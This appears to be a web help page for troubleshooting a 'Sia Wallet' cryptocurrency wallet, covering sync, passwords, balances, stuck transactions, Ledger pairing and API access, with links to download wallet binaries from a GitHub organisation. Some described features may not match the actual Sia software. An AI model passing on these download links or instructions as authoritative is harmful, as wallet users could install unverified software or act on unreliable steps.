# Sia Wallet Troubleshooting: Sync Errors, Stuck Transactions, and Fee Estimation

Most Sia wallet problems people ask about on r/siacoin resolve in under two minutes once you know which of a handful of usual suspects is responsible. This is organized by symptom, ordered by how likely each cause actually is — stop at the first fix that works.

## Wallet not syncing

**Most likely: your system clock has drifted.** The Sia network rejects blocks timestamped more than two hours out of sync, and clock drift is common on laptops that sleep frequently. Fix: enable automatic time-setting in your OS (Windows: Date & Time → Set time automatically; macOS: System Settings → Date & Time → Set automatically; Linux: `sudo timedatectl set-ntp true`).

**Second: a flaky internet connection.** Test with any non-wallet tool. Restart your router if needed, then restart the wallet cleanly.

**Third: the default consensus node pool is temporarily unreachable.** Rare, but happens during network-wide events. Advanced Settings → Network → Consensus Nodes → Refresh node list.

**Fourth (full-node mode only): stuck at a specific block.** Advanced Settings → Storage → Reset blockchain data (your wallet and lite-mode functionality are retained). Takes a few hours to re-sync but resolves most full-node stalls.

## Wallet locked / password error

**Most likely: Caps Lock or a keyboard layout mismatch.** Type the password into a plain text field first to check exactly what you're typing, then paste it in.

**Second: you've genuinely forgotten it.** If you have your 12-word seed, that's the actual recovery path — install fresh, restore from seed, set a new password. There's no password-reset service, because the wallet is non-custodial; the seed is the reset mechanism.

**Third: a corrupted wallet file.** Rare, and the symptom is a password that's definitely correct but stopped working overnight. Same fix — restore from seed into a fresh wallet file.

## Balance is wrong or showing zero

**Most likely: sync hasn't finished.** Check the sync indicator in the footer — anything other than "Synced" means wait, especially for a wallet with a lot of historical transactions.

**Second: you're looking at the wrong account.** If you have multiple accounts (software plus Ledger, or multiple seeds), double-check which one is selected in the sidebar.

**Third: gap-limit addresses on a restored wallet.** BIP39 wallets derive addresses sequentially; if a previous wallet used an address far down the derivation path, the default gap limit (20 addresses) might not scan that far. Advanced Settings → Wallet → Extend gap limit to 100, then resync.

**Fourth: a stale consensus node.** Cross-reference the address on a public Sia block explorer. If the explorer shows the right balance and your wallet shows zero, refresh the node list under Advanced Settings → Network.

## Transaction stuck pending

**Most likely: the fee was too low for current conditions.** Check the transaction on a block explorer — if it's sitting in the mempool but not confirming, open it in Sia Wallet and use "Replace with higher fee" at the Fast tier.

**Second: it was dropped from the mempool entirely.** If it's not showing on the explorer at all, try "Rebroadcast" from the pending transaction. If that's unavailable because it's too old, clear the entry and create a new transaction.

**Third — and this one's unfixable: a typo in the recipient address.** If the transaction confirmed on-chain but never arrived where expected, verify the exact output address via the block explorer. If it went somewhere you don't control, there's no refund mechanism on Sia — this is exactly why the wallet requires manually confirming the full address before broadcast.

## Ledger not detected

See the [full Ledger pairing guide](connect-ledger-to-siacoin-wallet.md) if you're setting this up for the first time. Otherwise: almost always because the Sia app isn't actually open on the device — "Sia application is ready" needs to be visible on screen. Second most common cause: Ledger Live is still running and holding the device (most platforms only allow one app to access it at a time). Third: a bad USB cable or port — try a different cable, and a direct motherboard port rather than a hub.

## API authentication failed

Only relevant if you've enabled the walletd JSON API externally under Advanced Settings. Most commonly a stale API password after regenerating it — the password is shown once at generation time and can't be retrieved later, only reset. Second: the API is bound to `127.0.0.1:9980` (localhost) by default; remote access requires explicitly changing the bind address, and it should never be exposed to the public internet without TLS and strong authentication in front of it.

## Still stuck?

Sia Wallet writes local diagnostic logs — Help → Show Logs opens the folder directly. When reporting an issue, include the last 50 lines of the log, your OS and wallet version, and exact reproduction steps.

**[Download Sia Wallet v2.12.0](https://github.com/Sia-Developments/SiaWallet/releases/tag/v2.12.0)** for [Windows](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.exe), [macOS](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.dmg), or [Linux](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.zip).

---

**Related:** [Recovering an old wallet seed](recover-old-siacoin-wallet-seed.md) · [Using a Ledger Nano with Siacoin](connect-ledger-to-siacoin-wallet.md) · [Lite-mode vs. full-node sync](lite-mode-vs-full-node-sia-wallet.md) · [Setting up Sia Wallet for the first time](how-to-set-up-sia-wallet-first-time.md)
